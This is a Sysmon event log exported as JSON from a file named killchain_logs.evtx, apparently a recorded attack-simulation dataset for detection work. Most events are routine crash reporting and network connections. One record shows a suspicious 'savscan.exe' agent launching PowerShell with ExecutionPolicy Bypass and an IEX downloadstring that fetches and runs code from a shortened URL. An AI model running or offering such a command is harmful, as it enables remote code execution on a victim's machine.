{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:05.242901"}, "EventRecordID": 19103, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "NetworkConnect include Group", "UtcTime": "2020-08-13 14:44:08.348", "ProcessGuid": "{4e85e66a-107a-5f31-f800-000000004300}", "ProcessId": 10628, "Image": "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", "User": "QISHNA\\garip", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58330, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "94.100.180.197", "DestinationHostname": "r.mail.ru", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304645.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.398235"}, "EventRecordID": 19104, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:08.393", "ProcessGuid": "{4e85e66a-51b8-5f35-1146-000000004300}", "ProcessId": 16568, "Image": "C:\\Windows\\System32\\WerFault.exe", "FileVersion": "10.0.18362.959 (WinBuild.160101.0800)", "Description": "Windows Problem Reporting", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "WerFault.exe", "CommandLine": "C:\\Windows\\system32\\WerFault.exe -pss -s 476 -p 9992 -ip 9992", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "LogonGuid": "{4e85e66a-100b-5f31-e703-000000000000}", "LogonId": "0x00000000000003e7", "TerminalSessionId": 0, "IntegrityLevel": "System", "Hashes": "MD5=57D3827BD373864C37E992E0902E28F5,SHA256=8B1162A2B8539242991C56B86C986B22622910AF7D180A51902A492C6D4B3379,IMPHASH=8FCD69E866F143A88CA98A7F0358577C", "ParentProcessGuid": "{4e85e66a-51b8-5f35-1046-000000004300}", "ParentProcessId": 14120, "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k WerSvcGroup"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.471184"}, "EventRecordID": 19105, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:08.466", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\System32\\WerFault.exe", "FileVersion": "10.0.18362.959 (WinBuild.160101.0800)", "Description": "Windows Problem Reporting", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "WerFault.exe", "CommandLine": "C:\\Windows\\system32\\WerFault.exe -u -p 9992 -s 1608", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "NT AUTHORITY\\LOCAL SERVICE", "LogonGuid": "{4e85e66a-100b-5f31-e503-000000000000}", "LogonId": "0x00000000000003e5", "TerminalSessionId": 0, "IntegrityLevel": "System", "Hashes": "MD5=57D3827BD373864C37E992E0902E28F5,SHA256=8B1162A2B8539242991C56B86C986B22622910AF7D180A51902A492C6D4B3379,IMPHASH=8FCD69E866F143A88CA98A7F0358577C", "ParentProcessGuid": "{4e85e66a-5120-5f35-0946-000000004300}", "ParentProcessId": 9992, "ParentImage": "C:\\Windows\\System32\\audiodg.exe", "ParentCommandLine": "C:\\Windows\\system32\\AUDIODG.EXE 0x470 0x4b4"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.621872"}, "EventRecordID": 19106, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:08.621", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERA829.tmp", "CreationUtcTime": "2020-08-13 14:44:08.620"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.622995"}, "EventRecordID": 19107, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:08.622", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERA829.tmp.dmp", "CreationUtcTime": "2020-08-13 14:44:08.621"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.774275"}, "EventRecordID": 19108, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:08.773", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERA8C6.tmp", "CreationUtcTime": "2020-08-13 14:44:08.773"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.775217"}, "EventRecordID": 19109, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:08.774", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERA8C6.tmp.WERInternalMetadata.xml", "CreationUtcTime": "2020-08-13 14:44:08.774"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.837215"}, "EventRecordID": 19110, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:08.836", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERA906.tmp", "CreationUtcTime": "2020-08-13 14:44:08.836"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.838152"}, "EventRecordID": 19111, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:08.837", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERA906.tmp.xml", "CreationUtcTime": "2020-08-13 14:44:08.837"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:08.987820"}, "EventRecordID": 19112, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:08.982", "ProcessGuid": "{4e85e66a-51b8-5f35-1446-000000004300}", "ProcessId": 19352, "Image": "C:\\Windows\\System32\\svchost.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Host Process for Windows Services", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "svchost.exe", "CommandLine": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wlidsvc", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "NT AUTHORITY\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410", "LogonGuid": "{4e85e66a-100b-5f31-e703-000000000000}", "LogonId": "0x00000000000003e7", "TerminalSessionId": 0, "IntegrityLevel": "System", "Hashes": "MD5=9520A99E77D6196D0D09833146424113,SHA256=DD191A5B23DF92E12A8852291F9FB5ED594B76A28A5A464418442584AFD1E048,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69", "ParentProcessGuid": "{4e85e66a-100b-5f31-0c00-000000004300}", "ParentProcessId": 960, "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentCommandLine": "C:\\Windows\\system32\\services.exe"}, "fields": {"time": 1597304648.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:09.254368"}, "EventRecordID": 19113, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:09.254", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_AUDIODG.EXE_d1a08f647a7566532b5bfcc2ff279753779b172c_cf729fac_b2419f00-b2f6-490e-9d7a-513e46f96b91", "CreationUtcTime": "2020-08-13 14:44:09.253"}, "fields": {"time": 1597304649.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:09.275774"}, "EventRecordID": 19114, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:09.275", "ProcessGuid": "{4e85e66a-51b8-5f35-1346-000000004300}", "ProcessId": 17868, "Image": "C:\\Windows\\system32\\WerFault.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_AUDIODG.EXE_d1a08f647a7566532b5bfcc2ff279753779b172c_cf729fac_b2419f00-b2f6-490e-9d7a-513e46f96b91\\Report.wer", "CreationUtcTime": "2020-08-13 14:44:09.275"}, "fields": {"time": 1597304649.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:09.450144"}, "EventRecordID": 19115, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:09.449", "ProcessGuid": "{4e85e66a-51b9-5f35-1546-000000004300}", "ProcessId": 15660, "Image": "C:\\Windows\\system32\\wermgr.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERAB65.tmp", "CreationUtcTime": "2020-08-13 14:44:09.449"}, "fields": {"time": 1597304649.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:09.451036"}, "EventRecordID": 19116, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:09.450", "ProcessGuid": "{4e85e66a-51b9-5f35-1546-000000004300}", "ProcessId": 15660, "Image": "C:\\Windows\\system32\\wermgr.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\WERAB65.tmp.WERInternalMetadata.xml", "CreationUtcTime": "2020-08-13 14:44:09.450"}, "fields": {"time": 1597304649.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:10.745672"}, "EventRecordID": 19117, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:10.732", "ProcessGuid": "{4e85e66a-51b9-5f35-1546-000000004300}", "ProcessId": 15660, "Image": "C:\\Windows\\system32\\wermgr.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_AUDIODG.EXE_d1a08f647a7566532b5bfcc2ff279753779b172c_cf729fac_b2419f00-b2f6-490e-9d7a-513e46f96b91", "CreationUtcTime": "2020-08-13 14:44:10.726"}, "fields": {"time": 1597304650.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:10.745911"}, "EventRecordID": 19118, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:10.733", "ProcessGuid": "{4e85e66a-51b9-5f35-1546-000000004300}", "ProcessId": 15660, "Image": "C:\\Windows\\system32\\wermgr.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_AUDIODG.EXE_d1a08f647a7566532b5bfcc2ff279753779b172c_cf729fac_b2419f00-b2f6-490e-9d7a-513e46f96b91\\d2fea873-f054-4d24-8da2-b2303fbf769a", "CreationUtcTime": "2020-08-13 14:44:10.733"}, "fields": {"time": 1597304650.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:10.746181"}, "EventRecordID": 19119, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:10.735", "ProcessGuid": "{4e85e66a-51b9-5f35-1546-000000004300}", "ProcessId": 15660, "Image": "C:\\Windows\\system32\\wermgr.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_AUDIODG.EXE_d1a08f647a7566532b5bfcc2ff279753779b172c_cf729fac_b2419f00-b2f6-490e-9d7a-513e46f96b91\\Report.wer", "CreationUtcTime": "2020-08-13 14:44:10.735"}, "fields": {"time": 1597304650.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:10.748531"}, "EventRecordID": 19120, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:10.746", "ProcessGuid": "{4e85e66a-51b9-5f35-1546-000000004300}", "ProcessId": 15660, "Image": "C:\\Windows\\system32\\wermgr.exe", "TargetFilename": "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\AppCrash_AUDIODG.EXE_d1a08f647a7566532b5bfcc2ff279753779b172c_cf729fac_b2419f00-b2f6-490e-9d7a-513e46f96b91\\7d3db5fe-508d-4dcf-b42e-f58df6fa52f0", "CreationUtcTime": "2020-08-13 14:44:10.746"}, "fields": {"time": 1597304650.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:11.258017"}, "EventRecordID": 19121, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "Info=Unknown Process Connecting to network", "UtcTime": "2020-08-13 14:44:14.716", "ProcessGuid": "{00000000-0000-0000-0000-000000000000}", "ProcessId": 15660, "Image": "<unknown process>", "User": "-", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58338, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "52.184.221.185", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304651.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 3}, "Version": 5, "Level": 4, "Task": 3, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:18.272900"}, "EventRecordID": 19122, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 16764}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "Technique=Commonly Used Port,Tactic=Command and Control,MitreRef=1043", "UtcTime": "2020-08-13 14:44:21.486", "ProcessGuid": "{4e85e66a-0ea9-5f35-6342-000000004300}", "ProcessId": 16796, "Image": "C:\\Program Files\\WindowsApps\\TelegramMessengerLLP.TelegramDesktop_2.2.0.0_x64__t4vj0pshhgkwm\\Telegram.exe", "User": "QISHNA\\garip", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.0.107", "SourceHostname": "host.docker.internal", "SourcePort": 58339, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "149.154.167.151", "DestinationHostname": "-", "DestinationPort": 443, "DestinationPortName": "https"}, "fields": {"time": 1597304658.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 1}, "Version": 5, "Level": 4, "Task": 1, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:22.077494"}, "EventRecordID": 19123, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "ProcessCreate include Group", "UtcTime": "2020-08-13 14:44:22.068", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)", "Description": "Windows PowerShell", "Product": "Microsoft\u00ae Windows\u00ae Operating System", "Company": "Microsoft Corporation", "OriginalFileName": "PowerShell.EXE", "CommandLine": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -c IEX (New-Object Net.Webclient).downloadstring(\\\"https://bit.ly/33H0QXi\\\")\"", "CurrentDirectory": "C:\\Windows\\system32\\", "User": "QISHNA\\garip", "LogonGuid": "{4e85e66a-1016-5f31-8b72-060000000000}", "LogonId": "0x000000000006728b", "TerminalSessionId": 1, "IntegrityLevel": "High", "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481", "ParentProcessGuid": "{4e85e66a-05a8-5f35-0242-000000004300}", "ParentProcessId": 11772, "ParentImage": "C:\\Users\\Public\\savscan.exe", "ParentCommandLine": "\"C:\\Users\\Public\\savscan.exe\" -socket 0.0.0.0:7010 -http http://127.0.0.1:8888 -contact tcp "}, "fields": {"time": 1597304662.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
{"System": {"Provider": {"@Name": "Microsoft-Windows-Sysmon", "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"}, "EventID": {"@Qualifiers": "", "$": 11}, "Version": 2, "Level": 4, "Task": 11, "Opcode": 0, "Keywords": "0x8000000000000000", "TimeCreated": {"@SystemTime": "2020-08-13 14:44:22.313766"}, "EventRecordID": 19124, "Correlation": {"@ActivityID": "", "@RelatedActivityID": ""}, "Execution": {"@ProcessID": 8748, "@ThreadID": 5336}, "Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "Qishna", "Security": {"@UserID": "S-1-5-18"}}, "EventData": {"RuleName": "FileCreate include Group", "UtcTime": "2020-08-13 14:44:22.278", "ProcessGuid": "{4e85e66a-51c6-5f35-1646-000000004300}", "ProcessId": 15280, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetFilename": "C:\\Users\\garip\\AppData\\Local\\Temp\\__PSScriptPolicyTest_riwoa0hu.cc1.ps1", "CreationUtcTime": "2020-08-13 14:44:22.278"}, "fields": {"time": 1597304662.0, "host": "Qishna", "source": "killchain_logs.evtx"}}
